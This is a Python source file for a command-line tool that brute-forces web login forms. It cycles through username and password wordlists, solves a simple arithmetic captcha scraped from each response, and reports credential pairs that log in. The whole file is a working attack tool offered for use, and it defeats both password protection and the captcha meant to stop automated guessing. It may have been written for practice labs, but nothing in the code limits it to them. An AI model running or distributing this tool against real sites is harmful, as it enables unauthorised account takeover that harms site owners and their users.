try:
 import requests
 import argparse
except:
 print("Error: requests and argparse are needed for this script to work")
 quit()

### 
print("###################################################")
print("#######  #####  ###    #      ##  ##  #############")
print("####### # ### # ### ## ###  ####      #############")
print("####### ## # ## ###    ###  ####  ##  #############")
print("####### ### ### ### ## ###  ####  ##  #############")
print("###################################################")
print("#######     ##     ##     #########################")
print("####### ######  ## ## ### #########################")
print("####### ######     ##     #########################")
print("#######     ##  ## ## #############################")
print("###################################################")
print("#######    # ### ##    ##     ##    ##    #########")
print("####### ## ## # ### ## ## ### ## ##### ############")
print("#######    ### ####    ##     ##    ##    #########")
print("####### ## ### #### ##### ### ##### ##### #########")
print("#######    ### #### ##### ### ##    ##    #########")
print("###################################################")
print("Author: cy-baz")
print("Version: 0.1")
###

# Arguments for the script
parser = argparse.ArgumentParser(description='Bruteforcer.')
parser.add_argument('-l',dest='url', help="URL to send login request to")
parser.add_argument('-u',dest='user', help="Wordlist of users to use",default="usernames.txt")
parser.add_argument('-p',dest='password', help="Wordlist of passwords to use", default="passwords.txt")
parser.add_argument('-e',dest='error', help="Error to use as a benchmark", default="Invalid ")
parser.add_argument('-up',dest='userParam', help="Name of username parameter",default="username")
parser.add_argument('-pp',dest='passParam', help="Name of password parameter",default="password")
parser.add_argument('-cp',dest='captchaParam', help="Name of capture parameter",default="captcha")
parser.add_argument('-m',dest='matchEq', help="String to match after/before the equation is specified. This string should only occur once in the response.",default="= ?")
parser.add_argument('-off',dest='offChange',type=int, default=12, help="Number of characters to look at prior to the matchEq string for the equation")
parser.add_argument('-d',dest='direction', default="before", help="Decides if the offset should be before or after the specified string")
parser.add_argument('-vP',dest='viewPayload', help="Check the payload to see if the details are as expected")
parser.add_argument('-vR',dest='viewResponse', help="Recieve the response of all payloads")
parser.add_argument('-vM',dest='viewMath', help="Check the string being treated as the equation to see if the '-m', '-off' and '-d' have found it. Using this with -viewPayload will help see what the 'equation' is and what it sends to the 'payload'")
args = parser.parse_args()


# Making argparse arguments easier to reference
url = args.url
user = args.user
passwords = args.password
error = args.error
direction = args.direction
viewPayload = args.viewPayload
viewResponse = args.viewResponse
viewMath = args.viewMath

# URL Parameter check
if not url:
 print("Error: Url not provided. Use the -l parameter to specify a url")
 quit()
elif "http://" not in url and "https://" not in url:
 print("Error: URL needs http:// or https:// at the beginning")
 quit()

if direction != 'before' and direction != 'after':
  print("Error: direction parameter should be 'before' or 'after'")
  quit()
 
## Parameters for URL
userParam = args.userParam
passParam = args.passParam
captchaParam = args.captchaParam

## Arguments for finding and using the captcha equation
matchEq = args.matchEq
offChange = args.offChange

# Function to perform the arithmetic
def arithmetic(p):

 # The location the captcha is found, based on the "= ?" being how it is identified
 offset = (p.text.find(matchEq))

 if direction == 'before':
  # Finding the equation before the "= ?", this might need tweaking based on the application/
  math = (p.text[offset-offChange:offset])

 elif direction == 'after':
  ## Len is used to make sure the offset is at the END of the specified string
   math = (p.text[offset+len(matchEq):offset+offChange])

 if viewMath is not None:
  print(math)


 # Splitting the equation into 3 parts (2 numbers and an operator)
 try:
  msplit = (math.split())
  firstNum = int(msplit[0])
  secondNum = int(msplit[2])
  operator = msplit[1]

 # Calculating the captcha
  if operator == '+':
   result = (firstNum + secondNum)
  elif operator == '-':
   result = (firstNum - secondNum)
  elif operator == '/':
   result =(firstNum / secondNum)
  elif operator == '*':
   result = (firstNum * secondNum)
  return result

 except:
  print("")

# Defining what goes in the payload (Unless more/less parameters are needed, this doesn't need to be changed)
def send(user,pw,result):
 if result == "FIRST": 
  payload = {
   userParam: user,
   passParam: pw,
   }

 else:
  payload = {
   userParam: user,
   passParam: pw,
   captchaParam: result
  }
 return(payload)

def baseRequest():
 # First payload to send (and payload to send after a successful cred
 payload = send('fakeUser','fakePassword',"FIRST")

 # First request, to get the captcha calculation
 with requests.Session() as s:
  p = s.post(url, data=payload)
  result = arithmetic(p)
  return result

##################################### END OF FIRST REQUEST

def brute_force(result):
 print("=== Brute forcing credentials while attempting to bypass captcha ===")
 result = baseRequest()
 # Cycle through usernames and passwords
 with open(user) as user_file:
  print("- - - Cycling through users - - -")
  for username in user_file:
   username=username.strip()
   print("\nCurrent user: " + username)
   with open(passwords) as pass_file:
    for password in pass_file:
     password=password.strip()

     # The payload to send (as defined in the send() function
     payload = send(username, password,result)
     if viewPayload is not None:
      print (payload)
     with requests.Session() as s:
      p = s.post(url, data=payload)
      result = arithmetic(p)
      if viewResponse is not None:
       print (p.text)

      # This is how we know if the credentials worked, more error checks can be added here if needed (as seen after the #)
      if error not in p.text: # and "does not exist" not in p.text:
       print ("+++ valid credentials: " + username + ":" + password)
       print (p.text) # Print the page response
       
       # Gets a valid captcha since a valid login doesn't recieve one (otherwise the next request would not work)
       result = baseRequest()

if __name__ =="__main__":
 brute_force(baseRequest())
